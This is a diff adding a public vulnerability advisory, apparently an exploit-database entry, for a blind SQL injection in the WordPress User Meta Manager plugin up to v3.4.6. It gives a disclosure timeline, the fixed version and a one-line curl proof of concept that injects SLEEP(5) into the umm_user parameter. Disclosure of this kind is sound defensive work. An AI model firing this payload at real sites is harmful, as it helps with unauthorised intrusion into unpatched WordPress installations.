@@ -1,0 +1,42 @@
+* Exploit Title: WordPress User Meta Manager Plugin [Blind SQLI]
+* Discovery Date: 2015/12/28
+* Public Disclosure Date: 2016/02/04
+* Exploit Author: Panagiotis Vagenas
+* Contact: https://twitter.com/panVagenas
+* Vendor Homepage: http://jasonlau.biz/home/
+* Software Link: https://wordpress.org/plugins/user-meta-manager/
+* Version: 3.4.6
+* Tested on: WordPress 4.4.1
+* Category: webapps
+
+Description
+================================================================================
+
+AJAX actions `umm_edit_user_meta` and `umm_delete_user_meta` of the User Meta 
+Manager for WordPress plugin up to v3.4.6 are vulnerable to blind SQL injection
+attacks. A registered user can pass arbitrary MySQL commands to `umm_user` GET 
+param.
+
+PoC
+================================================================================
+
+
+curl -c ${USER_COOKIES} \
+    "http://${VULN_SITE}/wp-admin/admin-ajax.php\?action=umm_switch_action\
+    &umm_sub_action=[umm_delete_user_meta|umm_edit_user_meta]&umm_user=SLEEP(5)"
+
+
+Timeline
+================================================================================
+
+2015/12/28 - Discovered
+2015/12/29 - Vendor notified via support forums in WordPress.org
+2015/12/29 - Vendor notified via contact form in his site
+2016/01/29 - WordPress security team notified about the issue
+2016/02/02 - Vendor released version 3.4.7
+2016/02/02 - Verified that this exploit no longer applies in version 3.4.7
+
+Solution
+================================================================================
+  
+Update to version 3.4.7
